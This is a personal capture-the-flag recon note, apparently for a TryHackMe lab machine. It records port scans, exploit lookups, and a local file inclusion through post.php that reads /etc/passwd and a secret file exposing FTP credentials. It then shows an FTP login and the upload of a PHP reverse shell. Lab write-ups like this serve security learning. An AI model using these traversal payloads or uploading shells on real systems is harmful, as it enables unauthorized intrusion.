---
id: recon
aliases:
  - RUSTSCAN
tags:
  - thm
  - ctf
---

### RUSTSCAN

```
rustscan -a 10.10.198.112 --ulimit 5000 -- -Pn -sC -sV
...
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e1:80:ec:1f:26:9e:32:eb:27:3f:26:ac:d2:37:ba:96 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7hN8ixZsMzRUvaZjiBUrqtngTVOcdko2FRpRMT0D/LTRm8x8SvtI5a52C/adoiNNreQO5/DOW8k5uxY1Rtx/HGvci9fdbplPz7RLtt+Mc9pgGHj0ZEm/X0AfhBF0P3Uwf3paiqCqeDcG1HHVceFUKpDt0YcBeiG1JJ5LZpRxqAyd0jOJsC1FBNBPZAtUA11KOEvxbg5j6pEL1rmbjwGKUVxM8HIgSuU6R6anZxTrpUPvcho9W5F3+JSxl/E+vF9f51HtIQcXaldiTNhfwLsklPcunDw7Yo9IqhqlORDrM7biQOtUnanwGZLFX7kfQL28r9HbEwpAHxdScXDFmu5wR
|   256 36:ff:70:11:05:8e:d4:50:7a:29:91:58:75:ac:2e:76 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBmjWU4CISIz0mdwq6ObddQ3+hBuOm49wam2XHUdUaJkZHf4tOqzl+HVz107toZIXKn1ui58hl9+6ojTnJ6jN/Y=
|   256 48:d2:3e:45:da:0c:f0:f6:65:4e:f9:78:97:37:aa:8a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHb7zsrJYdPY9eb0sx8CvMphZyxajGuvbDShGXOV9MDX
80/tcp open  http    syn-ack Apache httpd 2.4.29
|_http-generator: Jekyll v4.1.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Corkplacemats
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: Host: 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### ATTEMPTED

- Anonymous login for FTP:  FAILED

- Searchsploit: 
  - Apache 2.4.29 (requires ability to upload to the server)

    ```
    ┌──(kali㉿kali)-[~]
    └─$ searchsploit apache 2.4.29       
    ...
    Apache 2.4.17 < 2.4.38 - 'apache2ctl graceful' 'logrotate' Local Privilege Escalation | linux/local/46676.php
    ...
    ```
  - vsftpd 3.0.3
  ```
    ┌──(kali㉿kali)-[~]
    └─$ searchsploit apache 2.4.29       
    ...
    vsftpd 3.0.3 - Remote Denial of Service  | multiple/remote/49719.py
    ...
  ```

  - Jekyll v4.1.1
    - Found no vulnerabilites above 3.8

- Website:
  - /robots.txt
    ```
    User-agent: *
    Allow: /flag_1.txt
    Allow: /secret_file_do_not_read.txt
    ```

    - /flag_1.txt had a real flag
    - /secret_file_do_not_read.txt was a 403

  - LFI:
    - /post.php?post=secret_file_do_not_read.txt
      > Hi Mat, The credentials for the FTP server are below. I've set the files to be saved to /home/ftpuser/ftp/files. Will ---------- ftpuser:givemefiles777

    - /post.php?post=../../../etc/passwd
```
      root:x:0:0:root:/root:/bin/bash 
      daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
      bin:x:2:2:bin:/bin:/usr/sbin/nologin 
      sys:x:3:3:sys:/dev:/usr/sbin/nologin 
      sync:x:4:65534:sync:/bin:/bin/sync 
      games:x:5:60:games:/usr/games:/usr/sbin/nologin 
      man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
      lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin 
      mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
      news:x:9:9:news:/var/spool/news:/usr/sbin/nologin 
      uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
      proxy:x:13:13:proxy:/bin:/usr/sbin/nologin 
      www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin 
      backup:x:34:34:backup:/var/backups:/usr/sbin/nologin 
      list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin 
      irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin 
      gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin 
      nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin 
      systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin 
      systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin 
      syslog:x:102:106::/home/syslog:/usr/sbin/nologin 
      messagebus:x:103:107::/nonexistent:/usr/sbin/nologin 
      _apt:x:104:65534::/nonexistent:/usr/sbin/nologin 
      lxd:x:105:65534::/var/lib/lxd/:/bin/false 
      uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin 
      dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin 
      landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin 
      pollinate:x:109:1::/var/cache/pollinate:/bin/false 
      sshd:x:110:65534::/run/sshd:/usr/sbin/nologin 
      will:x:1000:1000:will:/home/will:/bin/bash 
      ftp:x:111:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin 
      ftpuser:x:1001:1001:,,,:/home/ftpuser:/usr/sbin/nologin 
      mat:x:1002:1002:,#,,:/home/mat:/bin/bash 
      toby:x:1003:1003:,,,:/home/toby:/bin/bash 
```

	- users:
      1.) will
      2.) mat
      3.) toby

  - FTP
    ```
    ┌──(kali㉿kali)-[~]
    └─$ ftp ftpuser@10.10.175.2
    Connected to 10.10.175.2.
    220 (vsFTPd 3.0.3)
    331 Please specify the password.
    Password: 
    230 Login successful.
    Remote system type is UNIX.
    Using binary mode to transfer files.
    ftp> cd files
    250 Directory successfully changed.
    ftp> ls
    229 Entering Extended Passive Mode (|||49858|)
    150 Here comes the directory listing.
    226 Directory send OK.
    ftp> put /home/kali/Cybersec/dkr/useful_scripts/revshell.php revshell.php
    local: /home/kali/Cybersec/dkr/useful_scripts/revshell.php remote: revshell.php
    229 Entering Extended Passive Mode (|||42041|)
    150 Ok to send data.
    100% |***********************************************************************************************************************************************************************************************|  5495      865.65 KiB/s    00:00 ETA
    226 Transfer complete.
    5495 bytes sent in 00:00 (6.69 KiB/s)
    ftp> exit
    221 Goodbye.

    ```
